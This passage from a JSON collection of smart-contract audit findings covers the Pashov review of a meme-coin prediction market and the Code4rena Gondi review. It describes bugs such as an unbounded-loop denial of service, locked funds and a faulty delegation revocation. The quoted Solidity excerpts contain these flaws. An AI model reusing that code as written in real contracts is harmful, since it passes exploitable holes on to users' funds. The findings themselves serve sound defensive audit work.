      "content": "\n_Acknowledged_\n\nTo determine whether the prediction is bullish or bearish in `claimReward()`, the calculation is as follows:\n```solidity\nbool isBullWinning = round.endPrice > round.startPrice;\n```\nIf `round.endPrice == round.startPrice`, the bearish predictions win by default. This gives the bearish position a slight advantage over the bullish.\n\nRecommendation: If `round.endPrice == round.startPrice`, refund the entire deposited amount to the users.\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "MCP_2025-08-07",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/MCP-security-review_2025-08-07.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "62476",
      "title": "[L-03] Blacklisted users' tokens are stuck after a win",
      "impact": "LOW",
      "content": "\n_Resolved_\n\nTo make predictions, `predict()` is used with USDC tokens, which implement blacklist logic. If a user is blacklisted after making a prediction and wins, their tokens will be permanently stuck in the contract because `claimReward()` sends rewards only to the original user, who can no longer withdraw due to the blacklist.\n\nRecommendation: Implement an owner-only function to withdraw USDC in such cases to prevent funds from being locked forever.\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "MCP_2025-08-07",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/MCP-security-review_2025-08-07.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "62475",
      "title": "[L-02] Some assets may be locked in the contract if treasury is address(0)",
      "impact": "LOW",
      "content": "\n_Resolved_\n\nWhen we end one round, we will calculate the fee. And based on current logic, we will transfer the treasury fee to the treasury address if the treasury address is not address(0). \n\nThe problem here is that if the treasury address is address(0), we will not transfer the treasury fee, and when users claim rewards, this part of fees will still be deducted from the rewards. So this part of the assets will be locked.\n```solidity\n    function endRound(uint256 marketId) external onlyOwner {\n        ...\n        // Calculate and transfer 5% fee to treasury\n        // total predict asset for this round.\n        uint256 totalPool = predictions[marketId][roundId].length * PREDICTION_FEE;\n        // treasury fee.\n        uint256 fee = (totalPool * 5) / 100;\n\n        if (fee > 0 && treasury != address(0)) {\n            // the token will always be USDC.\n            IERC20(markets[marketId].token).transfer(treasury, fee);\n            emit FeeTransferred(marketId, roundId, treasury, fee);\n        }\n        emit RoundEnded(marketId, roundId, price, totalPool, fee);\n    }\n```\n\nRecommendation: Here we have one assumption that the `treasury` should not be address(0). Suggest adding one security check to make sure that `treasury` is not address(0).\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "MCP_2025-08-07",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/MCP-security-review_2025-08-07.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "62474",
      "title": "[L-01] Later prediction rounds may not start at expected timestamp",
      "impact": "LOW",
      "content": "\n_Resolved_\n\nAccording to the discussion with sponsors, we expect to start a new round at the expected timestamp. For example, we expect to start a new round in each UTC 00:00.\n\nThe problem here is that when the owner wants to end this round at start timestamp + 24 hours, it will be quite difficult to end the round exactly at start timestamp + 24 hours. It's quite possible that we may delay one or two blocks. Then we can start one new round after the start timestamp + 24 hours + several blocks. In each round prediction, we will add one delay here. When we finish hundreds of rounds, we will find out that the actual start time for one new round is far away from our expected UTC 00:00. This will have a bad influence on predictors.\n\n```solidity\n    function endRound(uint256 marketId) external onlyOwner {\n        uint256 roundId = currentRoundId[marketId];\n        // storage.\n        Round storage round = marketRounds[marketId][roundId];\n        require(!round.ended, \"Round already ended\");\n        // If we reach the end of this round, the owner can end one round.\n        require(block.timestamp >= round.startTime + 24 hours, \"Round not over yet\");\n    }\n```\n\nRecommendation: Remove this requirement. \n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "MCP_2025-08-07",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/MCP-security-review_2025-08-07.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "62473",
      "title": "[M-03] Single-prediction design raises gas costs for high-volume users",
      "impact": "MEDIUM",
      "content": "\n_Resolved_\n\n## Severity\n\n**Impact:** Medium\n\n**Likelihood:** High\n\n## Description\n\nThe current predict function in the MemePredictionMarket contract only supports a fixed single prediction per transaction. Each user is charged exactly 5 USDC (PREDICTION_FEE) for every prediction they make, with no way to scale the amount in a single call.\n\nThis creates a bottleneck for users who want to place large predictions (e.g., $1,000 or $10,000). These users must call the predict function multiple times, each transferring 5 USDC, resulting in repetitive token transfer operations and expensive gas fees, especially on high-congestion chains like Ethereum Mainnet. When gas prices spike, each call may cost over $5 in gas, making the user experience inefficient and economically unreasonable.\n\n## Recommendations\n\nAllow users to place multiple predictions in a single transaction \n\n```solidity\nfunction predict(uint256 marketId, bool isBullish, uint256 amount) external roundActive(marketId) {\n\n// Total prediction cost\nuint256 totalFee = PREDICTION_FEE * amount;\n\n// Transfer total USDC fee from user to contract\nrequire(\n    IERC20(markets[marketId].token).transferFrom(\n        msg.sender,\n        address(this),\n        totalFee\n    ),\n    \"Payment failed\"\n);\n\n// Store prediction\npredictions[marketId][roundId].push(Prediction({\n    user: msg.sender,\n    isBullish: isBullish,\n    amount: totalFee\n}));\n```\n\n\n\n",
      "summary": "\nThe current predict function in the MemePredictionMarket contract only allows for one prediction per transaction, charging each user a fixed fee of 5 USDC. This causes issues for users who want to make large predictions, as they must make multiple calls and pay expensive gas fees. It is recommended to update the function to allow for multiple predictions in a single transaction.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "MCP_2025-08-07",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/MCP-security-review_2025-08-07.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "62472",
      "title": "[M-02] Late participation advantage in `MemePredictionMarket`",
      "impact": "MEDIUM",
      "content": "\n_Resolved_\n\n## Severity\n\n**Impact:** Medium\n\n**Likelihood:** Medium\n\n## Description\n\nThe current design of MemePredictionMarket allows users to make predictions for most of the round's duration (e.g., a 24-hour round with prediction open for 23 hours), which unintentionally benefits late participants. These users can observe more price action and make better-informed decisions than early participants, leading to an unfair advantage.\n\nExample scenario:\n\n- At the beginning of the round, the token price is 10.\n- A user joins early and makes a prediction.\n- Near the deadline (e.g., hour 23), the price rises to 15.\n- A new user sees this trend and makes the same bullish prediction, with a much higher confidence of winning.\n\nThis system disproportionately rewards those who join late, potentially disincentivizing early participation and harming the fairness of the prediction market.\n\n## Recommendations\n\nImplement time-based weighting: Earlier predictions could receive higher weight or rewards to compensate for increased uncertainty.\n\nincorporate price delta-based weighting: If a user joins after a significant price movement (e.g., from 10 to 20), their prediction reward could be adjusted based on the reduced risk taken.\n\n\n\n",
      "summary": "\nThe MemePredictionMarket has a bug where late participants have an unfair advantage over early participants. This is because they can observe more price action and make better predictions, leading to a disproportionate reward for late joiners. To fix this, the report recommends implementing time-based weighting or incorporating price delta-based weighting to compensate for the increased uncertainty and risk for early participants.",
      "quality_score": 5,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "MCP_2025-08-07",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/MCP-security-review_2025-08-07.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "62471",
      "title": "[M-01] Funds lock if all users choose same direction and price is incorrect",
      "impact": "MEDIUM",
      "content": "\n_Resolved_\n\n## Severity\n\n**Impact:** High\n\n**Likelihood:** Low\n\n## Description\nThe only way to withdraw tokens from the contract (excluding the fees sent to the treasury) is through `claimReward()`.\n```solidity\nfunction claimReward(uint256 marketId, uint256 roundId) external {\n        Round memory round = marketRounds[marketId][roundId];\n        require(round.ended, \"Round not ended\");\n        require(!hasClaimed[marketId][roundId][msg.sender], \"Already claimed\");\n\n        Prediction[] memory preds = predictions[marketId][roundId];\n        \n        // Determine winning direction (bullish if end price > start price)\n        bool isBullWinning = round.endPrice > round.startPrice;\n\n        // Calculate reward pool (total - 5% fee)\n        uint256 totalPool = preds.length * PREDICTION_FEE;\n        uint256 fee = (totalPool * 5) / 100;\n        uint256 rewardPool = totalPool - fee;\n\n        // Calculate user's share of winning predictions\n        uint256 totalWinningAmount = 0;\n        uint256 userWinningAmount = 0;\n\n        for (uint256 i = 0; i < preds.length; i++) {\n            if (preds[i].isBullish == isBullWinning) {\n                totalWinningAmount += preds[i].amount;\n                if (preds[i].user == msg.sender) {\n                    userWinningAmount += preds[i].amount;\n                }\n            }\n        }\n\n        require(userWinningAmount > 0, \"Not in winning group\");\n\n        // Calculate user's reward based on their share\n        uint256 reward = (rewardPool * userWinningAmount) / totalWinningAmount;\n\n        // Mark as claimed and transfer reward\n        hasClaimed[marketId][roundId][msg.sender] = true;\n        IERC20(markets[marketId].token).transfer(msg.sender, reward);\n\n        emit RewardClaimed(marketId, roundId, msg.sender, reward);\n    }\n```\nAs seen in the code, calculating a user's reward involves iterating through all predictions to determine `totalWinningAmount` and `userWinningAmount`. If all users predict the same direction, `totalWinningAmount` and  `userWinningAmount` become zero for all the users. This results in no one being able to claim rewards, effectively locking all funds in the contract permanently.\n\nIf even a single user predicts the opposite direction, they receive the entire `rewardPool`. However, if no one does, there's no valid winning side, and since there's no alternative mechanism to withdraw the tokens, they remain permanently stuck in the contract with no way to recover them.\n\n## Recommendations\nOne solution could be to send all the tokens from that round to the treasury if no one correctly predicts the price direction.\n\n\n\n",
      "summary": "\nThis bug report discusses an issue in a smart contract that prevents users from withdrawing their tokens. The only way to withdraw tokens is through a function called `claimReward()`, but if all users predict the same direction, the function fails and no one can claim their rewards. This results in all funds being permanently stuck in the contract with no way to recover them. The report suggests sending all tokens to the treasury if no one correctly predicts the price direction as a possible solution.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "MCP_2025-08-07",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/MCP-security-review_2025-08-07.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "62470",
      "title": "[H-01] `claimReward()` can DOS by iterating predictions blocking funds",
      "impact": "HIGH",
      "content": "\n_Resolved_\n\n## Severity\n\n**Impact:** High\n\n**Likelihood:** Medium\n\n## Description\nUsers can create an unlimited number of predictions for a specific market and round using `predict()`.\n```solidity\nfunction predict(uint256 marketId, bool isBullish) external roundActive(marketId) {\n        uint256 roundId = currentRoundId[marketId];\n        Round memory round = marketRounds[marketId][roundId];\n\n        // Predictions close 1 hour before round ends to prevent last-minute manipulation\n        require(block.timestamp < round.startTime + 23 hours, \"Prediction closed (last hour)\");\n\n        // Transfer 5 USDC fee from user to contract\n        require(IERC20(markets[marketId].token).transferFrom(\n            msg.sender,\n            address(this),\n            PREDICTION_FEE\n        ), \"Payment failed\");\n\n        // Store the prediction\n        predictions[marketId][roundId].push(Prediction({\n            user: msg.sender,\n            isBullish: isBullish,\n            amount: PREDICTION_FEE \n        }));\n        emit PredictionMade(marketId, roundId, msg.sender, isBullish, PREDICTION_FEE);\n    }\n```\nThe `predictions` array can grow indefinitely because it is unbounded. When `claimReward()` is called, the entire `predictions` array is checked.\n```solidity\nfunction claimReward(uint256 marketId, uint256 roundId) external {\n        \n        Round memory round = marketRounds[marketId][roundId];\n        require(round.ended, \"Round not ended\");\n        require(!hasClaimed[marketId][roundId][msg.sender], \"Already claimed\");\n\n        Prediction[] memory preds = predictions[marketId][roundId];\n        \n        // Determine winning direction (bullish if end price > start price)\n        bool isBullWinning = round.endPrice > round.startPrice;\n\n        // Calculate reward pool (total - 5% fee)\n        uint256 totalPool = preds.length * PREDICTION_FEE; \n        uint256 fee = (totalPool * 5) / 100;\n        uint256 rewardPool = totalPool - fee;\n\n        // Calculate user's share of winning predictions\n        uint256 totalWinningAmount = 0;\n        uint256 userWinningAmount = 0;\n\n        for (uint256 i = 0; i < preds.length; i++) {\n            if (preds[i].isBullish == isBullWinning) {\n                totalWinningAmount += preds[i].amount;\n                if (preds[i].user == msg.sender) {\n                    userWinningAmount += preds[i].amount;\n                }\n            }\n        }\n\n       ///code...\n    }\n```\nThis could cause the transaction to exceed the block’s maximum gas limit and revert, resulting in a denial-of-service (DoS) that permanently locks funds in the contract.\n\nThis scenario is likely because the amount is fixed at 5 USDC in `PREDICTION_FEE`. For example, if a user wants to predict 10,000 USDC, 2,000 entries would be added to the `predictions` array.\n\n## Recommendations\nTo solve the issue, set a maximum limit on the number of predictions allowed per round.\n\n\n\n",
      "summary": "\nThis report discusses a bug in a code that allows users to create an unlimited number of predictions for a specific market and round. This can cause the transaction to exceed the block’s maximum gas limit and result in a denial-of-service (DoS) attack, permanently locking funds in the contract. The report recommends setting a maximum limit on the number of predictions allowed per round to prevent this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "MCP_2025-08-07",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/MCP-security-review_2025-08-07.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "49533",
      "title": "[L-12] `vaultID`’s NFT/ERC20 bundle can be modified while the loan is outstanding",
      "impact": "LOW",
      "content": "\nUserVault.sol allows a user to bundle assets (NFT/ERC20) together in a vault to be used as a collateral NFT.\n\nAccording to [doc](https://app.gitbook.com/o/4HJV0LcOOnJ7AVJ77p8e/s/W2WSJrV6PSLWo4p8vIGq/vaults), the intended behavior is `new NFTs cannot be added to the vault unless borrower burn the vault and create a new vaultId with a new bundle of asset`.\n\nThis is not currently the case in UserVault.sol. Anyone can deposit ERC20 or ERC721 to an existing `vaultID` at any time. Although this doesn’t decrease assets from the vault, this may increase VaultID assets at any time during lender offer signing, loan outstanding, and loan liquidation auction process.\n```\n\n    function depositERC721(uint256 _vaultId, address _collection, uint256 _tokenId) external {\n        _vaultExists(_vaultId);\n\n        if (!_collectionManager.isWhitelisted(_collection)) {\n            revert CollectionNotWhitelistedError();\n        }\n        _depositERC721(msg.sender, _vaultId, _collection, _tokenId);\n    }\n\n    function _depositERC721(address _depositor, uint256 _vaultId, address _collection, uint256 _tokenId) private {\n        ERC721(_collection).transferFrom(_depositor, address(this), _tokenId);\n\n        _vaultERC721s[_collection][_tokenId] = _vaultId;\n\n        emit ERC721Deposited(_vaultId, _collection, _tokenId);\n    }\n```\n\n`src/lib/UserVault.sol# L152-L158`\n\nIncreasing the assets of a `vaultId` doesn’t put a loan’s collateralization at risk. However, this may create inconsistencies in lender offers due to `vaultId`‘s changing asset bundle.\n\nDue to the permissionless deposit process of UserVault.sol, this may also allow a malicious actor to deposit assets to a `vaultID` during auciton to manipulate bidding.\n\n### Recommendation\n\nIf the intention is to disallow adding new NFTs to a vault before burning of `vaultId`, consider a two-step deposit and vault mint process: caller deposit assets to a new `vaultId` first before minting the `vaultId` and disallow deposit to a `vaultId` after minting.\n\n---\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi-invitational",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "49532",
      "title": "[L-11] Incorrect comments",
      "impact": "LOW",
      "content": "\n**Instances (2)**\n\n1. Auction Loan liquidator -> User Vault\n```\n\n/// @title Auction Loan Liquidator\n/// @author Florida St\n/// @notice NFTs that represent bundles.\ncontract UserVault is ERC721, ERC721TokenReceiver, IUserVault, Owned {\n...\n```\n\n`src/lib/UserVault.sol# L13`\n\n2. `address(0)` = ETH -> address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE) = ETH\n```\n\n    /// @notice ERC20 balances for a given vault: token => (vaultId => amount). address(0) = ETH\n    mapping(address token => mapping(uint256 vaultId => uint256 amount)) _vaultERC20s;\n```\n\n`src/lib/UserVault.sol# L33`\n\n### Recommendation\n\nCorrect comments.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi-invitational",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "49531",
      "title": "[L-10] Some proposed callers might not be confirmed",
      "impact": "LOW",
      "content": "\nLoanManagerParameterSetter.sol has a two-step process of adding callers. The issue is `addCallers()` doesn’t check whether `_callers.length == proposedCallers.length`. If `_callers.length < proposedCaller.length`, some `proposedCallers`’ indexes will not run in the for-loop. `proposedCallers` whose indexes are after callers will not be added as callers.\n```\n\n//src/lib/loans/LoanManagerParameterSetter.sol\n    function addCallers(ILoanManager.ProposedCaller[] calldata _callers) external onlyOwner {\n        if (getProposedAcceptedCallersSetTime + UPDATE_WAITING_TIME > block.timestamp) {\n            revert TooSoonError();\n        }\n        ILoanManager.ProposedCaller[] memory proposedCallers = getProposedAcceptedCallers;\n        uint256 totalCallers = _callers.length;\n|>      for (uint256 i = 0; i < totalCallers;) {\n            ILoanManager.ProposedCaller calldata caller = _callers[i];\n            if (\n                proposedCallers[i].caller != caller.caller || proposedCallers[i].isLoanContract != caller.isLoanContract\n            ) {\n                revert InvalidInputError();\n            }\n\n            unchecked {\n                ++i;\n            }\n        }\n        ILoanManager(getLoanManager).addCallers(_callers);\n    }\n```\n\n`src/lib/loans/LoanManagerParameterSetter.sol# L110`\n\n### Recommendation\n\nAdd check to ensure `_callers.length == proposedCallers.length`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi-invitational",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "49530",
      "title": "[L-09] Unnecessary code - BytesLib methods are not used in this contract or its parent contracts",
      "impact": "LOW",
      "content": "\nBytesLib methods are not used in PurchaseBundler.sol or its parent contracts.\n```\n\n//src/lib/callbacks/PurchaseBundler.sol\n    using BytesLib for bytes;\n...\n```\n\n`src/lib/callbacks/PurchaseBundler.sol# L24`\n\n### Recommendation\n\nConsider removing this line.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi-invitational",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "49529",
      "title": "[L-08] `updateLiquidationContract()` might lock collaterals and funds in the current liquidator contract",
      "impact": "LOW",
      "content": "\nIn `LiquidationHandler::updateLiquidationContract()`, the loan liquidator contract can be updated.\n```\n\n    function updateLiquidationContract(address __loanLiquidator) external override onlyOwner {\n        __loanLiquidator.checkNotZero();\n        _loanLiquidator = __loanLiquidator;\n        emit LiquidationContractUpdated(__loanLiquidator);\n    }\n```\n\n`src/lib/LiquidationHandler.sol# L74`\n\nThere are two vulnerable conditions: `updateLiquidationContract()` is called when there are ongoing/unsettled auctions in the current liquidator or there might be a pending `liquidateLoan()` tx.\n\n1. If MultisourceLoan’s liquidator contract is updated. None of the exiting auctions originated from the MultisourceLoan can be settled because `AuctionLoanLiquidator::settleAuction` will call `IMultiSourceLoan(_auction.loanAddress).loanLiquidated(...` (`src/lib/AuctionLoanLiquidator.sol# L300`). This will cause the `onlyLiquidator` modifier to revert (`src/lib/loans/MultiSourceLoan.sol# L464`). MultiSourceLoan contract no longer recognizes the old liquidator contract. The collateral and bid funds will be locked in the old liquidator contract.\n2. If there is a pending `MultiSourceLoan::liquidateLoan` (`src/lib/loans/MultiSourceLoan.sol# L445`) tx before `updateLiquidationContract()` call. The auction of the loan will be created right before `updateLiquidationContract()` settles. Similar to number 1, the collateral will be locked in the old liquidator contract. In addition, since `MultiSourceLoan::liquidateLoan()` is permissionless, an attacker can front-run `updateLiquidationContract` tx to cause the loan liquidated to an old liquidator contract.\n\n### Recommendation\n\n1. In `UpdateLiquidationContract()`, consider adding a check that the existing liquidator’s token balance is 0, with no outstanding auction.\n2. Only update `liquidationContract` when there are no liquidatable loans.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi-invitational",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "49528",
      "title": "[L-07] Consider adding a cap for `minLockPeriod`",
      "impact": "LOW",
      "content": "\n`_minLockPeriod` is used to compute the lock time for a tranche or a loan. If the ratio is set too high (e.g., 10000), tranches or loans cannot be refinanced due to failing `_loanLocked()` checks (`src/lib/loans/MultiSourceLoan.sol# L181`).\n```\n\n//src/lib/loans/MultiSourceLoan.sol\n    function setMinLockPeriod(uint256 __minLockPeriod) external onlyOwner {\n\n        _minLockPeriod = __minLockPeriod;\n\n        emit MinLockPeriodUpdated(__minLockPeriod);\n    }\n```\n\n`src/lib/loans/MultiSourceLoan.sol# L508`\n\n### Recommendation\n\nConsidering adding a cap value (e.g., 10%).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi-invitational",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "49527",
      "title": "[L-06] Borrowers might use a lender’s `addNewTranche` renegotiation offer to `refinanceFull` in some cases",
      "impact": "LOW",
      "content": "\nA borrower can use a lender’s renegotiation offer signature for `addNewTranch()` in `refinanceFull()`, as long as the loan only has one tranche.\n\nThis is because `refinanceFull()` only checks whether `_renegotiationOffer.trancheIndex.length == _loan.tranche.length` (`src/lib/loans/MultiSourceLoan.sol# L168`). When there’s only one tranche in the loan, `addNewTranche()`’s `renegoationOffer`’s check condition (`src/lib/loans/MultiSourceLoan.sol# L379`) will also satisfy.\n\n`refinanceFull()` will also ensure the refinanced tranche gets a better apr (`src/lib/loans/MultiSourceLoan.sol# L591`). So the borrower gets better apr for the existing tranche instead of taking out additional principal in `addNewTranche()`.\n\nIn addition, if the lender signed a renegotiation offer intended for `refinanceFull()`, the same offer can also be used for `addNewTranche()` if the condition `_renegotiationOffer.trancheIndex[0] == _loan.tranche.length` is satisfied. Because `_renegotiationOffer.trancheIndex[0]` is never checked in `refinanceFull()` flow, the lender might supply any values. In this case, the lender is forced to open a more junior tranche which can be risky for lenders.\n\nIt’s better to prevent the same renegotiation offer from being used interchangeably in different methods with different behaviors.\n\n### Recommendation\n\nIn `refinanceFull()`, add a check to ensure `_renegotiationOffer.trancheIndex[0]==0`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi-invitational",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "49526",
      "title": "[L-05] Borrower can use an arbitrary `offerId` for a pool contract’s loan offer, which might lead to incorrect off-chain accounting.",
      "impact": "LOW",
      "content": "\n`offerId` is a field in struct `LoanOffer` (`src/interfaces/loans/IMultiSourceLoan.sol# L26`) and `LoanOffer` is typically signed by the lender. Currently, `offerId` is generated off-chain and its correctness is verified through `_checkSignature(lender, offer.hash()`, `_lenderOfferSignature` (`src/lib/loans/MultiSourceLoan.sol# L780`) in the emitLoan flow.\n\nBut when the lender is a pool contract, `offerId` will not be verified due to `_checkSignature()` being bypassed in `_validateOfferExectuion()` (`src/lib/loans/MultiSourceLoan.sol# L777`).\n\nA borrower can supply any offerIds for a pool lender offer in `emitLoan()` or `refinanceFromLoanExeuctionData()` flow. As a result, `emit LoanEmitted(loanId, offerIds, loan, totalFee)` or `emit LoanRefinancedFromNewOffers(_loanId, newLoanId, loan, offerIds, totalFee)` will contain arbitrary `offerIds`. This may create conflicts in off-chain offerId accounting.\n\n### Recommendation\n\nIf `offerId` for a pool lender is relevant, consider allowing a pool contract to increment and store its next offerId on-chain.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi-invitational",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "49525",
      "title": "[M-01] Delegations cannot be removed in some cases due to vulnerable `revokeDelegate()` implementation",
      "impact": "MEDIUM",
      "content": "\n\nAn old borrower can use an old delegation to claim on behalf of a new borrower.\n\n### Proof of Concept\n\nA borrower can delegate locked collateral NFT through `delegateRegistry` to prove token ownership and claim airdrops, event ticketing, etc.\n\n[`delegateRegistry`](https://etherscan.io/address/0x00000000000000447e69651d841bD8D104Bed493# code) by Delegate.Cash protocol allows custom rights to be configured to a delegatee.\n\nCurrently, `MultiSourceLoan::delegate` allows a borrower to configure `bytes32 _rights` to `delegateERC721`. In `DelegateRegistry::delegateERC721`, `bytes32 rights` will be [hashed as part of the key](https://github.com/delegatexyz/delegate-registry/blob/ce89e65f9364db21fc621e247a829d9c08374b4e/src/DelegateRegistry.sol# L83) to store delegation data.\n```\n\n//src/lib/loans/MultiSourceLoan.sol\n    function delegate(uint256 _loanId, Loan calldata loan, address _delegate, bytes32 _rights, bool _value) external {\n        if (loan.hash() != _loans[_loanId]) {\n            revert InvalidLoanError(_loanId);\n        }\n        if (msg.sender != loan.borrower) {\n            revert InvalidCallerError();\n        }\n        //@audit-info a borrower can pass custom rights to delegateERC721\n|>      IDelegateRegistry(getDelegateRegistry).delegateERC721(\n            _delegate, loan.nftCollateralAddress, loan.nftCollateralTokenId, _rights, _value\n        );\n\n        emit Delegated(_loanId, _delegate, _value);\n    }\n```\n\n`src/lib/loans/MultiSourceLoan.sol# L484`\n\nThe problem is, in `MultiSourceLoan::revokeDelegate`, empty rights will always be passed to `delegateERC721`. This means when a borrower configures custom rights in `delegate()`, they cannot remove the delegation. In `DelegateRegistry::delegateERC721`, empty rights will be hashed into a different key from the borrower’s actual delegation. [Incorrect delegation data will be read](https://github.com/delegatexyz/delegate-registry/blob/ce89e65f9364db21fc621e247a829d9c08374b4e/src/DelegateRegistry.sol# L83-L85) and `delegateERC721` call will return with no change.\n```\n\n//src/lib/loans/MultiSourceLoan.sol\n    function revokeDelegate(address _delegate, address _collection, uint256 _tokenId) external {\n        if (ERC721(_collection).ownerOf(_tokenId) == address(this)) {\n            revert InvalidMethodError();\n        }\n        //@audit revokeDelegate will always pass empty rights.\n|>      IDelegateRegistry(getDelegateRegistry).delegateERC721(_delegate, _collection, _tokenId, \"\", false);\n\n        emit RevokeDelegate(_delegate, _collection, _tokenId);\n    }\n```\n\n`src/lib/loans/MultiSourceLoan.sol# L496`\n\n**POC:**\n\n1. The original borrower set custom rights and delegated their collateral NFT to a custom contract.\n2. The original borrower’s loan ended and NFT is transferred to a new borrower.\n3. The protocol or the new borrower calls `revokeDelegate()` to remove previous delegations of the NFT.\n4. The new borrower takes out a loan with the NFT and calls `delegate()`, delegating the NFT to a hot wallet.\n5. The original borrower’s old delegation is not cleared from `delegateRegistry` and still claims an event ticket using the old delegation. The old borrower claims the new borrower’s ticket.\n\n### Recommended Mitigation Steps\n\nIn `revokeDelegate()`, allow passing `bytes32 _rights` into `delegateERC721()` to correctly revoke existing delegations with custom rights.\n\n### Assessed type\n\nError\n\n**0xend (Gondi) confirmed**\n\n**0xsomeone (judge) commented:**\n\n> The Warden has outlined how the protocol will incorrectly integrate with the `DelegateRegistry` system, attempting to revoke a previous delegation via an empty payload which is a futile attempt as proper revocation would require the same `_rights` to be passed in with a `false` value for the `_enable` flag.\n>\n> I am slightly mixed in relation to this submission as the `MultiSourceLoan::delegate` function can be utilized with a correct payload to remove delegation from the previous user correctly. I believe that users, protocols, etc., will attempt to use the `MultiSourceLoan::revokeDelegate` function to revoke their delegation, and thus, a medium-risk severity rating is appropriate even though a circumvention already exists in the code.\n>\n> To note, the code also goes against its `interface` specification (`src/interfaces/loans/IMultiSourceLoan.sol# L257-L261`) further re-inforcing a medium-risk rating level.\n\n---\n\n",
      "summary": "\nThe bug report discusses an issue where an old borrower can use an old delegation to claim on behalf of a new borrower. This is possible due to a flaw in the `delegateRegistry` code, which allows borrowers to delegate locked collateral NFTs to prove token ownership and claim airdrops or event tickets. However, the `revokeDelegate()` function does not properly revoke previous delegations, leading to incorrect delegation data being read and the old borrower being able to claim on behalf of the new borrower. The recommended mitigation step is to allow passing `bytes32 _rights` in the `delegateERC721()` function to correctly revoke existing delegations with custom rights. This bug has been confirmed by a security expert, and it has been noted that it goes against the interface specification. This bug has been rated as a medium-risk severity issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi-invitational",
      "github_link": "",
      "tags": [],
      "finders": [
        "oakcobalt"
      ]
    },
    {
      "id": "35271",
      "title": "[L-04] Incorrect spelling",
      "impact": "LOW",
      "content": "\nThere’s one instance of incorrect spelling: `renegotiationIf` should be `renegotiationId`.\n```\n\n//src/lib/loans/BaseLoan.sol\n    mapping(address user => mapping(uint256 renegotiationIf => bool notActive))\n        public isRenegotiationOfferCancelled;\n```\n\n`src/lib/loans/BaseLoan.sol# L57`\n\n### Recommendation\n\nChange `renegotiationIf` into `renegotiationId`.\n\n",
      "summary": "",
